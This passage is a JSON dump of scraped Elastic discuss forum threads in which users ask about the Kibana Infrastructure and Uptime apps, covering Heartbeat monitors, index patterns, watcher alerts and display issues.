    "date": "February 6, 2019, 5:39pm February 6, 2019, 5:50pm February 6, 2019, 5:52pm February 6, 2019, 5:54pm February 6, 2019, 5:58pm February 6, 2019, 7:57pm February 6, 2019, 8:02pm February 6, 2019, 8:08pm February 6, 2019, 8:12pm March 6, 2019, 8:24pm",
    "body": "Hello World! I'm using Elastic stack 6.6.0 now and while at Infrastructure Kibana's app (on smaller screen), host.name and metric are not displaying correctly (missing) unless user hover over mouse over blank box and then user sees host and metric. I didn't had this issue with previous release (on same screen size). Please advise.",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "e1edd54b-b9d3-4c4e-a6ec-48c54253dcbd",
    "url": "https://discuss.elastic.co/t/infrastructure-ui-with-windows-and-unix-hosts/163799",
    "title": "Infrastructure UI with Windows and Unix hosts",
    "category": [
      "Metrics"
    ],
    "author": "Marc-Antoine_J",
    "date": "January 10, 2019, 7:45pm January 11, 2019, 11:22am January 11, 2019, 5:37pm January 16, 2019, 10:05am January 16, 2019, 5:53pm January 17, 2019, 11:30am January 30, 2019, 11:13am February 27, 2019, 11:25am",
    "body": "I'm discovering the new Infrastructure UI and I like it so far. But I had a few issue especially with the year change. I was configuring my beats to use the metricbeat-{+YYYY.MM} index naming pattern. Since I set it up in december it only created one index (metricbeat-2018.12). Then I have set my elastic host (unix) to log metricbeats directly to elasticsearch. After I have set many Windows host to do the same. Everything worked fine so far. Then the month (and year) changed... The new index created with no templates. The infrastructure stopped showing the hosts info. I went to look for the template mapping and it was set for metricbeat-6.5.4 index names only. I changed it for metricbeat-*. It worked for my unix host then I noticed that I had set 2 different template mapping for windows hosts and unix host. I had set Windows hosts to metricbeat-local. Don't bother asking for the confusion it was before the holiday leave. My head was already gone. Then I noticed that the template were different. If it was created by the unix host it started with the docker settings and maybe things are just not in the same order I thought. But then fixing both configs (Windows and Unix) I noticed that both did not get their logs correctly in the templates. So now I have configured metricbeat-unix-{+YYYY.MM.dd} (added day for rollover) for unix and metricbeat-windows-{+YYYY.MM.dd} for Windows hosts. I thought that infrastructure was taking it's docs from metricbeat-* but now I can see I have both indexes, they both have tons of documents but infrastructure UI shows only Windows hosts. I must be missing something? Thanks,",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "2a247114-6a1c-4e1f-b288-d8cfe54e7091",
    "url": "https://discuss.elastic.co/t/infrastructure-logs-ui-change-index/163428",
    "title": "Infrastructure Logs UI change index?",
    "category": [
      "Metrics"
    ],
    "author": "krainboltgreene",
    "date": "January 9, 2019, 12:31am January 22, 2019, 7:25pm January 9, 2019, 6:03pm February 6, 2019, 6:03pm",
    "body": "Hi, the logs UI is incredible, I love it, but I would much rather be able to define which indices I'm watching. Is that feasible?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "35286f65-60f5-4913-a633-66a4d516bd69",
    "url": "https://discuss.elastic.co/t/group-servers-in-one-square-box/159867",
    "title": "Group servers in one square box",
    "category": [
      "Metrics"
    ],
    "author": "mladen",
    "date": "December 7, 2018, 7:28am December 7, 2018, 10:28am January 4, 2019, 10:28am",
    "body": "Hello, Your new feature Infrastructure UI is awesome. For some time, me and my colleague building something similar in Canvas. I have one question about grouping server. Is it possible to get the result of tag query in one square box which will represent all servers’ tags belongs to? Servers will be expanded (drill down) when click on square box. For example, to display one square box for all SAP servers that may be drill down for details per server as it is now. The idea is if one the server exceeds the threshold the square box will change color to display warning in server group. BR, Mladen",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "95693de1-ad47-4202-923a-7a55bafc78ea",
    "url": "https://discuss.elastic.co/t/multiple-failed-to-format-messages-in-log-stream/159579",
    "title": "Multiple 'failed to format' messages in log stream",
    "category": [
      "Metrics"
    ],
    "author": "kenbergquist",
    "date": "December 5, 2018, 5:32pm December 5, 2018, 6:08pm December 5, 2018, 6:22pm December 6, 2018, 12:36pm January 3, 2019, 12:36pm",
    "body": "I'm seeing the message 'failed to format message from /var/log/audit/audit.log' repeatedly in the Infrastructure app log stream. Disabling the auditd module stops the messages, as you'd expect. Any insight would be sincerely appreciated.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d2d46377-ccc6-46f3-8bbd-7f9dcd254bbc",
    "url": "https://discuss.elastic.co/t/where-is-my-infrastructure-data/157039",
    "title": "Where is my infrastructure data?",
    "category": [
      "Metrics"
    ],
    "author": "ethrbunny",
    "date": "November 16, 2018, 11:36am November 16, 2018, 12:30pm November 16, 2018, 6:22pm November 16, 2018, 7:00pm November 17, 2018, 1:43pm November 18, 2018, 11:29pm November 19, 2018, 1:33pm November 19, 2018, 6:40pm November 20, 2018, 2:54am November 23, 2018, 7:41am November 23, 2018, 12:57pm November 23, 2018, 1:45pm November 23, 2018, 2:43pm November 23, 2018, 3:02pm November 23, 2018, 3:11pm November 23, 2018, 3:14pm November 23, 2018, 11:15pm November 26, 2018, 12:47pm November 27, 2018, 12:45pm November 28, 2018, 6:24pm",
    "body": "Just discovered the new \"infrastructure\" menu item. Unfortunately, despite having many, many GB of data there doesn't seem to be anything to display here. I have plenty of dashboard data and am gathering from a slew of different *beat providers. I've tried a variety of options in the \"search for infrastructure data\" field. So - what am I doing wrong?",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "95dda086-a249-4b68-b4f7-d9afbff1348d",
    "url": "https://discuss.elastic.co/t/infrastructure-ui-colouring-feedback/159152",
    "title": "Infrastructure UI Colouring Feedback",
    "category": [
      "Metrics"
    ],
    "author": "adaisley",
    "date": "December 3, 2018, 11:21am December 5, 2018, 9:33am December 31, 2018, 12:51pm",
    "body": "Hi, Overall, the Infrastructure UI is absolutely fantastic! I had recently started looking into metricbeat to log our hosts and our Docker containers, and then v6.5 released and so we instantly upgraded to get this awesome new feature. My main question, and I suppose feedback at the moment is that the gradient for the metricset usage is not changeable. A member of our team is red/green colourblind and he said the shading for the grey-blue part of the gradient is not at all helpful and that he's unable to tell the difference. It would be nice if we could make our own gradient, so every member of our team doesn't have difficulty using the software. I know it's in Beta currently and this might already be a future feature. Something to bear in mind I guess cheers",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "30272dd0-8b12-4b04-878d-0be3343e3bf5",
    "url": "https://discuss.elastic.co/t/dark-mode/157958",
    "title": "Dark mode",
    "category": [
      "Metrics"
    ],
    "author": "alexus",
    "date": "November 23, 2018, 4:33am November 23, 2018, 2:44pm December 21, 2018, 10:45am",
    "body": "Is there a way to enable \"dark mode\"? Kibana in general definitely should be more \"dark mode\" friendly for sure...",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "248bd98b-c0fa-4669-b1df-3415a9856ec3",
    "url": "https://discuss.elastic.co/t/about-the-uptime-category/167978",
    "title": "About the Uptime category",
    "category": [
      "Uptime"
    ],
    "author": "warkolm",
    "date": "February 17, 2019, 12:45am March 27, 2019, 2:07pm March 27, 2019, 9:25pm March 27, 2019, 9:25pm",
    "body": "Welcome to the place to discuss all things Uptime. This is the perfect place to discuss the Uptime Kibana App. If you have questions, think you may have found a bug, or would like to discuss the Uptime app in any other way, post here!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "28976117-7331-4fde-a104-1df4fcdc11e5",
    "url": "https://discuss.elastic.co/t/alert-once-if-monitor-is-down-or-comes-back-up/226534",
    "title": "Alert once if monitor is down or comes back up",
    "category": [
      "Uptime"
    ],
    "author": "irishwill2008",
    "date": "April 6, 2020, 6:31pm",
    "body": "Hey guys, I am fairly new to this but I need some help with my watcher setup. I have setup Heartbeat and I currently have 7 monitors. i.e monitor-01 monitor-02 etc. I need help setting up my exact scenarios, I need help with 3 scenarios: Scenario 1: If monitor-01 goes offline, I want to send ONLY 1 email to \"test@domain.com\" with the body of: \"Hello there, monitor-01 just went offline! Please check, thanks.\" If monitor-02 goes offline, I want the exact same result as above.. I dont want multiple emails alerting me every second / minute if the monitor is down, I only want 1 email. Scenario 2: If monitor-01 or any my monitors are offline... Every 3 hours, I want a refresh email sent out (I would like the email body to contain how long the specific monitor is down for, i.e monitor down for 120hours 13 minutes). So, if 3 hours pass, I want to send an email to \"test@domain.com\" with the body of: \"Hello there, this is a reminder email that monitor-01 is still offline! Please check, thanks.\" Scenario 3: If any of the monitors come back online, I want to send out an email to \"test@domain.com\" with the body of: \"Hello there, great news! monitor-02 is back online. The monitor was down for 7hours 12 minutes. Thanks.\" Can someone please assist? I looked everywhere and cannot find the correct syntax to create the above scenarios. These would be scenarios I feel could benefit other members of the community. P.s, I currently have an advanced watch that I found in the forums but does not match my criteria. Here is the code for it: { \"trigger\": { \"schedule\": { \"interval\": \"10s\" } }, \"input\": { \"search\": { \"request\": { \"search_type\": \"query_then_fetch\", \"indices\": [ \"heartbeat-*\" ], \"body\": { \"query\": { \"bool\": { \"must\": { \"match\": { \"monitor.status\": \"down\" } }, \"filter\": { \"range\": { \"@timestamp\": { \"from\": \"now-50s\" } } } } }, \"aggregations\": { \"by_monitors\": { \"terms\": { \"field\": \"monitor.id\", \"size\": 10, \"min_doc_count\": 1 } } } } } } }, \"condition\": { \"compare\": { \"ctx.payload.hits.total\": { \"gt\": 0 } } }, \"actions\": { \"email_admin\": { \"email\": { \"profile\": \"standard\", \"from\": \"noreply@domain.com\", \"to\": [ \"test@domain.com\" ], \"subject\": \"Monitor is DOWN: monitorname\", \"body\": { \"text\": \"Hello, there is a monitor offline currently. Please login to check.\" } } } } } Thanks very much.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8c3171ad-c831-4d61-b3a3-8fe9f08f17a5",
    "url": "https://discuss.elastic.co/t/uptime-module-kibana/224870",
    "title": "Uptime module (Kibana)",
    "category": [
      "Uptime"
    ],
    "author": "ManuelF",
    "date": "March 25, 2020, 2:34pm March 27, 2020, 5:12pm March 30, 2020, 12:56pm March 30, 2020, 10:02pm March 31, 2020, 4:26pm",
    "body": "Hi, related to topic \"Parse the field host\" ( Parse the field host), I have another question, but the topic is closed. Is there a way to replace \"icmp-anothericmp-ip@0.0.0.0\" to show only \"anothericmp\" under Host column and yet show the right IP address under IP column? I tried just putting the host name in the configuration file instead of the IP address. This will show the Host name as desired, but then the IP will not match. It will show 127.0.1.1 or other unknown IP address. If I leave \"localhost\" on each server configuration, then I will have a lot of \"localhost\" in the Uptime dashboard. Thanks",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "4e717fe8-85c3-4bce-8bd7-47393839580f",
    "url": "https://discuss.elastic.co/t/index-name-that-uptime-look-for/221198",
    "title": "Index name that Uptime look for",
    "category": [
      "Uptime"
    ],
    "author": "leprovokateur",
    "date": "February 27, 2020, 9:42am February 27, 2020, 12:26pm February 27, 2020, 12:28pm February 27, 2020, 12:44pm February 28, 2020, 10:20am March 2, 2020, 8:06pm March 2, 2020, 8:20pm March 2, 2020, 8:46pm March 26, 2020, 8:46pm",
    "body": "Hi, I want to have different users not to be able to see all uptime data in the Uptime app. My approach would be to have different heartbeat instances creating indices with different names and set the permissions for the users appropriately. For which index names does the Uptime app look for? Best regards, Robert",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "d4d037a5-c79f-4444-97d8-457622cfb18f",
    "url": "https://discuss.elastic.co/t/uptime-displaying-cumulative-number-of-up-and-down-monitors/219025",
    "title": "Uptime displaying cumulative number of up and down monitors",
    "category": [
      "Uptime"
    ],
    "author": "bwright1558",
    "date": "February 12, 2020, 3:19pm February 24, 2020, 8:21pm March 19, 2020, 5:09pm",
    "body": "After upgrading Elasticsearch and Kibana to version 7.6.0, Uptime is now displaying the cumulative counts for up and down monitors. My 600+ HTTP heartbeat monitors run once every 2 hours. When I filter by downed monitors in the last 2 hours, it might show me 17 are down. As I increase the time range, the number of downed monitors continues to increase. I almost went into a panic when I got into the office today and saw 367 monitors were down (over the last 30 days). But in actuality, only 17 were down since the last time the monitors ran. Is this a bug or is this an undocumented new \"feature\"?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "71cfb5c8-2400-4f75-af4b-061eb8d1eae1",
    "url": "https://discuss.elastic.co/t/uptime-monitor-status-doesnt-show-my-22-services-show-randonly-but-not-the-total/218988",
    "title": "Uptime (Monitor Status) doesn't show my 22 services (show randonly) but not the total",
    "category": [
      "Uptime"
    ],
    "author": "rafaelcassau",
    "date": "February 12, 2020, 1:26pm February 12, 2020, 2:10pm February 12, 2020, 5:52pm February 13, 2020, 2:22pm February 13, 2020, 3:22pm February 18, 2020, 2:31pm February 18, 2020, 3:21pm February 18, 2020, 3:21pm February 24, 2020, 1:57pm February 24, 2020, 2:48pm March 19, 2020, 2:55pm",
    "body": "I've configured heart-beat and uptime in the elastic stack cloud, but after I've added my 22 endpoints I noticed that the sections \"All monitors are up\" and \"Pings over time\" are work correctly but the section \"Monitor Status\" doesn't list all my endpoints, sometimes when I change the time range and press the refresh button the list of endpoints change, sometimes the next page works but the total services never are listed. Sometimes just 5 endpoints are listed without pagination, if I refresh the page 14 endpoints are listed, if I do it again the list are empty.",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "90307925-4882-40c7-93e9-3eab166c58c0",
    "url": "https://discuss.elastic.co/t/there-was-an-error-retrieving-the-index-pattern/218610",
    "title": "There was an error retrieving the index pattern",
    "category": [
      "Uptime"
    ],
    "author": "OrangeDog",
    "date": "February 10, 2020, 2:58pm February 11, 2020, 2:07pm February 11, 2020, 3:52pm February 12, 2020, 10:34am February 12, 2020, 2:01pm March 7, 2020, 2:02pm",
    "body": "Continuing [7.5] There was an error retrieving the index pattern I had the same issue and tried removing the xpack.security.enabled: false setting. However, then kibana failed to complete startup; serving \"Kibana server is not ready yet\" with nothing in the logs. Then when I put the config back and restarted kibana again, elasticsearch (on the same server) was OOM killed. Having resolved that, Kibana still didn't work, and making another request appears to have DoSed the whole machine (whether through CPU load or OOM or both I'm not yet sure). After a reboot it all seems to be working again (though the original issue remains). So in summary, I had the same (minor) problem, and trying the suggested fix made it considerably worse.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "f988e586-5195-41ae-b221-1f8b192d8837",
    "url": "https://discuss.elastic.co/t/heartbeat-checking-multiple-http-response-codes/214959",
    "title": "[Heartbeat] Checking multiple http response codes",
    "category": [
      "Uptime"
    ],
    "author": "seblg",
    "date": "January 14, 2020, 10:12am January 23, 2020, 9:25pm January 23, 2020, 9:27pm January 30, 2020, 5:02pm January 30, 2020, 5:15pm January 30, 2020, 6:20pm February 23, 2020, 6:20pm",
    "body": "Hi, We've started using heartbeat agents (6.8.2) and uptime monitoring for monitoring api endpoints. We'd like to attribute all http reponse codes which are not 500 or 503 as being \"up\", going through documentation this doesn't seem possible. Either we do not set, in the monitor yml, check.response: status: x and by default 4xx and 5xx are considered down, either we are only able to set one value in check.response status which will be labeled as up. Is there a workaround or a solution for passing a list of response codes we expect to mean up or ones we want to set to down ? Thanks,",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "29bd25c2-8888-48de-880f-43f56464af55",
    "url": "https://discuss.elastic.co/t/missing-info-in-dashboard/215129",
    "title": "Missing info in dashboard",
    "category": [
      "Uptime"
    ],
    "author": "Heatzone87",
    "date": "January 15, 2020, 12:12pm January 23, 2020, 9:22pm January 24, 2020, 8:41am February 17, 2020, 8:50am",
    "body": "Hey, I have Heartbeat running. It is registering data correctly however in Kibana i cant see any monitors? The graph itself shows that it is registering data. image1810×528 42.8 KB Best Pim",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "7ee99db4-0f7a-4e03-ab3a-515bf106a849",
    "url": "https://discuss.elastic.co/t/7-5-there-was-an-error-retrieving-the-index-pattern/210742",
    "title": "[7.5] There was an error retrieving the index pattern",
    "category": [
      "Uptime"
    ],
    "author": "robrotheram",
    "date": "December 5, 2019, 4:24pm December 10, 2019, 3:05am December 10, 2019, 10:31am December 11, 2019, 2:39pm December 11, 2019, 11:41pm December 13, 2019, 2:53pm December 26, 2019, 10:14am January 2, 2020, 10:21am January 2, 2020, 1:47pm January 2, 2020, 3:23pm January 7, 2020, 9:37pm January 31, 2020, 9:37pm",
    "body": "I just updated to 7.4.0 -> 7.5.0 and in uptime I now see below the query bar the warning There was an error retrieving the index pattern But I can see all 100+ monitors and can filter on location. But the query bar is grey out and is disabled. I have made sure that the 2 heartbeats are updated to 7.5 and rerun the setup just to make sure. I also tried to delete all kibana indexes and restart kibana no such luck Of note is that this is running in a air gaped environment and so I disabled newsfeed and telemetry",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "acc23c30-f56b-49de-9fcb-ab95ab8cadc3",
    "url": "https://discuss.elastic.co/t/uptime-indices-setting-available/212311",
    "title": "Uptime indices setting available?",
    "category": [
      "Uptime"
    ],
    "author": "norgro2601",
    "date": "December 18, 2019, 11:58am January 6, 2020, 10:07am January 26, 2020, 1:43pm",
    "body": "Hi, in the spaces I've created, I limit access to certain indices, so space A has access to heartbeat-a-* indices and space B has access to heartbeat-b-* indices only. I've created role A and role B to achieve this. In the Metrics app or SIEM app, there are space related settings available, which I can use to set the used indices for that app in that space, for the Uptime app, I don't have this. This is a problem, if a user has both roles, then he sees the heartbeat monitors for both roles in the Uptime app, no matter, which space he is using. Are there any hidden settings I can use eg. with the saved objects APIs to set an indices value ? Regards, Norbert",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ded1c92a-9e4c-420c-b511-ad221b61128b",
    "url": "https://discuss.elastic.co/t/uptime-availability-solution/212071",
    "title": "Uptime Availability Solution",
    "category": [
      "Uptime"
    ],
    "author": "Mauricio_Borges",
    "date": "December 16, 2019, 10:59pm December 17, 2019, 8:49pm January 10, 2020, 8:49pm",
    "body": "Heartbeat and Uptime are great tools to probe ICMP, TCP Ports and Webpages. However going further I'd like to know if exist or there plans to provide Reports and Visualizations/Dashboards. Such as: System and Services history be exportable ( ie: pdf, office files ), so we can save a Status to provide reports internally to customer. For example, suppose we have an Agreement with a customer to keep 95% of availability for specific Service, so it will be required provide some Monthly Reports to check availability and possible outages. Ability to create dynamic visualizations ( or maybe a canvas ) to show up a current status for specific Service or System. Or maybe some templates to easy integrate with Uptime. Easy way to create an Watch Alert on UpTime page. IE: If Service or System fail for X times send Alert to .... Thanks, Mauricio",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c9296ddf-59fb-4285-9b0f-d03a3d1a24a2",
    "url": "https://discuss.elastic.co/t/uptime-7-5-overview-pagination-settings/210259",
    "title": "Uptime 7.5: Overview pagination settings",
    "category": [
      "Uptime"
    ],
    "author": "Slavik_Fursov",
    "date": "December 3, 2019, 12:18am December 5, 2019, 6:51pm December 29, 2019, 6:51pm",
    "body": "Upgraded to 7.5 I see, that Uptime app now has pagination. ok. However, it looks like I can't change number of rows per page. Is it true? Looks to be major omission. The app (only 10 rows) now looks strange on my 32\" 4k monitor. Submitted issue: github.com/elastic/uptime Overview Pagination: add ability to specify N of rows/page opened 11:16PM - 02 Dec 19 UTC SlavikCA 7.5.0 added Pagination to the overview page. However, it always 10 rows per page. Doesn't look good on my 32\" 4k monitor. Previously (without...",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "b06769e7-0b7d-4071-8400-3bcee8950c2e",
    "url": "https://discuss.elastic.co/t/links-in-uptime-do-not-work-7-4/206983",
    "title": "Links in uptime do not work [7.4]",
    "category": [
      "Uptime"
    ],
    "author": "robrotheram",
    "date": "November 11, 2019, 1:48pm November 14, 2019, 8:48pm December 10, 2019, 10:33pm",
    "body": "I have upgraded to kibana 7.4 from 6.7 and the links in uptime to view in infra UI or Logui do not work. I running kibana through nginx and I have a basepath set to /kibana . I have set up a rewrite rule in nginx rewrite /kibana/(.*)$ /$1 The I have set the base-path in kibana to /kibana and set rewriteBasePath to false. if I click on one of the links in Uptime for example \"show host metrics\" I go to \"https://kibana/app/infra...\" which does not exist. It seem to be stripping out the server url. I am unsure what has gone wrong",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "0f5c4291-d41c-4466-b117-41fe424295a2",
    "url": "https://discuss.elastic.co/t/allow-monitoring-of-metricbeat-uptime-data-in-kibana-uptime-app/205395",
    "title": "Allow monitoring of metricbeat uptime data in Kibana Uptime app",
    "category": [
      "Uptime"
    ],
    "author": "bruce289",
    "date": "October 27, 2019, 11:32pm November 6, 2019, 9:09pm November 7, 2019, 9:32pm December 1, 2019, 9:32pm",
    "body": "Hi, The metricbeat system module is able to ship uptime metrics to elasticsearch: https://www.elastic.co/guide/en/beats/metricbeat/current/metricbeat-metricset-system-uptime.html It would be great if these were made available in the Kibana Uptime view. Thanks.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "122b4269-4f62-49ed-8ebf-723a0348b971",
    "url": "https://discuss.elastic.co/t/monitor-the-json-payload-from-heartbeat-yml/199740",
    "title": "Monitor the JSON payload from heartbeat.yml",
    "category": [
      "Uptime"
    ],
    "author": "mfang329",
    "date": "September 17, 2019, 12:24am October 9, 2019, 12:52pm November 2, 2019, 12:52pm",
    "body": "I'm new to the uptime / heartbeat service Version 6.8.3 that I'm trying to config brunch of urls which sends the healthbeat result to Uptime Kibana. The basic JSON payload body should return the following output, EG: curl -i https://identityserver-p-xx-ue1.abc.com/api/v1/health/details {\"CanConnectToIdentityDB\":\"Ok At: 09/17/2019 00:05:13 +00:00\",\"CanConnectToUserProfileService\":\"Ok At: 09/17/2019 00:05:13 +00:00\"} curl -i \"https://openidapi-d-xx-ue1.bluebeam-dev.com/api/v1/health/details\" {\"canConnectToIdentityDB\":\"Ok At: 09/17/2019 00:05:22 +00:00\",\"canConnectToUserProfileService\":\"Ok At: 09/17/2019 00:05:22 +00:00\"} What I'm trying to capture in the heartbeat.yaml is to detect the JSON response has a validate object such that Key can be any service strings and Value is \"OK\" without the timestamp string. {\"CanConnectToIdentityDB\":\"Ok*\", \"CanConnectToUserProfileService\":\"OK*\"} or {\"CanConnectToIdentityDB\":\"Ok*\"} From what I read here, https://www.elastic.co/guide/en/beats/heartbeat/6.8/configuration-heartbeat-options.html, it seems possible with JSON condition and mix multiline regex clauses. There is not much example in this area or any answer on the web, if you can provide an example on how to go about it then it would be wonderful.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "21ac4a99-204c-487a-a407-dd0ca500f538",
    "url": "https://discuss.elastic.co/t/missing-data-when-using-using-fields-and-tags-in-uptime-7-3-0/199460",
    "title": "Missing data when using using fields and tags in uptime 7.3.0",
    "category": [
      "Uptime"
    ],
    "author": "Dannyb",
    "date": "September 13, 2019, 4:21pm September 19, 2019, 1:54pm September 19, 2019, 4:18pm September 19, 2019, 6:13pm September 23, 2019, 2:25pm September 23, 2019, 6:42pm October 17, 2019, 6:42pm",
    "body": "I’ve added some tags to my heartbeat monitor: fields: Environment: test SiteName: mysite fields_under_root: true ( although this doesn't make any different to the issue) Soon as I do this on the uptime board, the monitor status grid doesn’t show anything.. it just shows the status going from left to right. the pings over time works fine. The search text box just has “loading,….” In it. I can find my documents in discovery searching against the new fields If remove the fields, delete the heart indexes, fresh the kibana indexes, pray a little it eventually sorts itself Also, if I add tags the search doesn’t work in the uptime search bar like the discovery tab does.. Works: tags:api doesn’t work tags:api AND tags:dev I’m I using it wrong? Is there any reason guys didn’t just create normal dashboards like the rest of us have to instead of creating your own custom ones? I’ve just got the continue frustration and disappointment when trying to do anything in kibana dashboards. I love the stack, but just things always fall short. thanks",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "51922a5e-ba35-4c87-8e08-e26b9c076cf1",
    "url": "https://discuss.elastic.co/t/monitors-not-showing-in-uptime/198243",
    "title": "Monitors not showing in Uptime",
    "category": [
      "Uptime"
    ],
    "author": "norgro2601",
    "date": "September 5, 2019, 12:18pm September 13, 2019, 12:28pm September 13, 2019, 12:28pm October 7, 2019, 12:28pm",
    "body": "I have an index with name \"heartbeat-something\". In the considerations for uptime it's said, that uptime requires an index pattern called \"heartbeat-7*\". https://www.elastic.co/guide/en/uptime/current/install-heartbeat.html I've created an alias \"heartbeat-7-something\" as the workaround, but still uptime is not showing any data. What have I missed ? Regards, Norbert",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "700232b3-963f-4b2a-861a-9df2368e3864",
    "url": "https://discuss.elastic.co/t/monitor-status-table/196921",
    "title": "Monitor Status Table",
    "category": [
      "Uptime"
    ],
    "author": "Surya369",
    "date": "August 27, 2019, 10:09am August 29, 2019, 3:28pm September 22, 2019, 3:39pm",
    "body": "There has been an issue that the monitor status tab is only able to show 50 entries whereas I have setup this system for 54 entries. The endpoint status is displaying that all the 54 servers are up but the monitor status is only able to display 50 entries. Is this a limitation of the monitor status tab?? My elastic version is 6.8.1",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "aa3e4edf-da89-4c6f-a088-3b094f8e0c33",
    "url": "https://discuss.elastic.co/t/add-id-as-one-of-the-columns-index-page/196371",
    "title": "Add ID as one of the columns (index page)",
    "category": [
      "Uptime"
    ],
    "author": "shanekm",
    "date": "August 22, 2019, 4:52pm August 22, 2019, 5:06pm August 22, 2019, 6:43pm August 22, 2019, 7:38pm September 15, 2019, 7:38pm",
    "body": "I've set up everything and it's working. However my urls for heartbeat are pretty long (under ID drop down) ex: http://myservertocheck.uat.net:19081/QA/Configuration.Service/Status.Api/api/application/status/QA.Configuration -Is there any way to have ID field show up on the main screen as one of the columns? -Better yet, since ID in my case is long can it only display the last string after / ie \"QA.Configuration\" Example: image.png1892×733 57.1 KB",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "99ef522d-c74e-4e62-8dcb-8194f84183e9",
    "url": "https://discuss.elastic.co/t/how-to-use-fields-and-attributes-in-uptime/185203",
    "title": "How to use fields and attributes in Uptime?",
    "category": [
      "Uptime"
    ],
    "author": "Johntdyer",
    "date": "June 11, 2019, 1:50pm July 5, 2019, 1:58pm August 10, 2019, 2:35am",
    "body": "I have configured Heartbeat to send fields via config but I am not sure how I would actually make use of those fields in the \"Uptime\" panel in Elasticsearch ? Are there any examples of how to make use of these attributes? I would love to for example search all endpoints that have field:foo and a response time over xxx seconds...",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ee22e205-9582-4069-a67f-24dafb2d7140",
    "url": "https://discuss.elastic.co/t/uptime-just-spins/193900",
    "title": "Uptime Just Spins",
    "category": [
      "Uptime"
    ],
    "author": "richard_N",
    "date": "August 6, 2019, 12:24am August 6, 2019, 11:43am August 10, 2019, 2:34am September 3, 2019, 2:34am",
    "body": "Just setup a fresh 7.3 cluster across the board. Everything was working but I deleted an old heartbeat index and now my Uptime dashboard just spins. The index recreated correctly and I can view all heartbeats on the Discover dashboard but nothing on Uptime. I just get the loading screen and it never stops. Everything is set to defaults. Index pattern is default 7.3 index pattern. Template is there.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "497fdd2c-fe95-410a-a1b2-c377965edc76",
    "url": "https://discuss.elastic.co/t/using-a-different-index-other-than-heartbeat-7-0-0/193134",
    "title": "Using a different Index other than Heartbeat-7.0.0",
    "category": [
      "Uptime"
    ],
    "author": "PeterPain",
    "date": "July 31, 2019, 2:09pm August 1, 2019, 8:17am August 2, 2019, 4:11am August 5, 2019, 10:30am August 5, 2019, 10:30am August 29, 2019, 10:30am",
    "body": "Hey dear Elastic-Team, The documentation gives following specification about how the index should be named for uptime App. Kibana 7.0 requires an index of heartbeat-7* (containing documents from Heartbeat 7.0). And im using Heartbeat but have a different name for my index so im not able to use the Uptime App. Is it possible to use a different index name than Heartbeat-7* for the Uptime-App ? Or is this currently not possible ? Thanks for any response",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "5a060d19-a97f-424b-bb02-92f9ed6cf4f4",
    "url": "https://discuss.elastic.co/t/heatbeat-with-snmp/185398",
    "title": "Heatbeat with SNMP",
    "category": [
      "Uptime"
    ],
    "author": "Michel99_7",
    "date": "June 12, 2019, 11:35am July 6, 2019, 11:35am July 10, 2019, 10:19am",
    "body": "It would be nice to use such a tool to request a device via a snmp request...",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "026f90a9-2a05-4bfe-b478-7d05bfbfd913",
    "url": "https://discuss.elastic.co/t/uptime-for-iot-devices-without-heartbeat-tool/180014",
    "title": "Uptime for IoT devices without heartbeat tool",
    "category": [
      "Uptime"
    ],
    "author": "michaelsogos",
    "date": "May 7, 2019, 3:35pm May 9, 2019, 8:29pm May 10, 2019, 7:59am May 10, 2019, 12:07pm May 10, 2019, 12:42pm May 10, 2019, 4:22pm May 10, 2019, 5:01pm June 3, 2019, 5:09pm July 9, 2019, 5:39am",
    "body": "We have some IoT devices installed on an external area (think of a retail chain which for each shop has installed our IoT devices). And our main priority is to get UPTIME status for each of them. We investigate about Heartbeat, but seems that Heartbeat is responsible to collect information via HTTP, TCP or ICMP. Unfortunately no one of the above cases fit our needs because the IoT device is behind an firewall and not accessible from outside, then we need to SEND HEARTBEAT SIGNAL from IoT device to Elastic cluster (the opposite how heartbeat works). How we can do that? Also we saw and investigate about APM (for nodejs in our case) and we found a lot of usefull information about LOGS and METRICS but nothing about UPTIME; do you think that APM should also care about UPTIME metric?",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "c2ad0079-f213-4e31-96f8-80e24541b166",
    "url": "https://discuss.elastic.co/t/how-to-upgrade-uptime-from-6-8-to-7-1-easily/186790",
    "title": "How to upgrade Uptime from 6.8 to 7.1 easily",
    "category": [
      "Uptime"
    ],
    "author": "skyluke.1987",
    "date": "June 21, 2019, 3:31am June 21, 2019, 3:45am July 15, 2019, 3:45am",
    "body": "Dear all, recently I updated the Kibana from 6.7 to 7.1.1. When I launch the new kibana and found out that the data of uptime is coming in, but the visualization can't be loaded. Thinking to upgrade straightaway, but can't really find steps to do it directly. Anyone has came across any guide ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "797796cd-74ff-489a-9e6f-1e0cd6ac554f",
